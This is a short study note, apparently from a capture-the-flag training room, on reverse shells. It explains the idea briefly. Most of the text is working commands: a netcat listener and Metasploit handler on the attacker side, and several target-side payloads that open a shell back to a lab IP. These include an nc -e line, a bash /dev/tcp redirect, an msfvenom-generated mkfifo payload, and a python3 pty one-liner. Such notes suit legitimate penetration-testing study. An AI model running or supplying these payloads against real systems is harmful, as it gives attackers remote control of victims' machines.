A reverse shell, also known as a remote shell or “connect-back shell,” takes advantage of the target system’s vulnerabilities to initiate a shell session and then access the victim’s computer. The goal is to offer the attacker machine a shell instead of my machine requesting it from the target which would be much easier to evade firewalls.

# Useful Commands:

## On the Attacker machine

To start a netcat listener we use  the following command

```bash
sudo nc -lvnp <port-number>
```

or we can use the `exploit/multi/handler` module which is like socat and netcat, used to receive reverse shells, It's also the only way to interact with a meterpreter shell, and is the easiest way to handle staged payloads, use the following Metasploit command to use the module:

```msfconsole
use exploit/multi/handler
```
## On the target machine

To connect to a listener and offer it a shell we can use this nc command:

```bash
 nc -e /bin/bash ip_here port_here
```

Or we can use:

```bash
 #!/bin/bash  
 bash -i >& /dev/tcp/10.2.54.112/4445 0>&1
```

 or we can use msfvenom to generate a payload, noting that the syntax should be in this format `msfvenom -p <PAYLOAD> <OPTIONS>`, and the naming convention for the payload should be like this `<OS>/<arch>/<payload>`.:

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
```

 This would be the generated payload after using the previous command: 

```bash
mkfifo /tmp/ttlrs; nc 10.2.54.112 4444 0</tmp/ttlrs | /bin/sh >/tmp/ttlrs 2>&1; rm /tmp/ttlrs
```

 or we can use this payload which uses python3 and is very useful and handy reverse shell:

```bash
export RHOST="10.2.54.112";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

# Extra:

**Important Note :** 
This note was taken from the network services - Telnet room:

The netcat reverse shell will not close target-side after you close it locally
so the program will be blocked (hanging).
The python3 shell is a lot smarter, and it will notice when it's disconnected
and stop the process.
After it stopped, it means the program is ready for the next command.

Big Thanks for Edu